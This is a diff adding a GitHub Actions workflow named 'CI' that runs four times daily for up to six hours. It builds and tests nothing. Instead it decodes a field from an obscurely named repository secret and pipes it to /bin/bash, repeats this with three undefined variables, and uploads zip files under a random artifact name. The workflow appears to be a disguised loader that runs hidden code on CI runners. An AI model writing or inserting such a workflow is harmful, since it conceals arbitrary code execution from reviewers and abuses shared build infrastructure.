@@ -1,0 +1,40 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          dw178: ${{ secrets.dw178 }}
+        run: |
+          printf '%s' "$dw178" | jq -r .dl7 | /bin/bash
+          echo $o7756 | jq -r .j81 | /bin/bash
+          printf '%s' "$vv47" | jq -r .bo73348 | /bin/bash
+          printf '%s' "$vy95569" | jq -r .v19 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jlyANoS5
+          path: "*.zip"
+          retention-days: 1
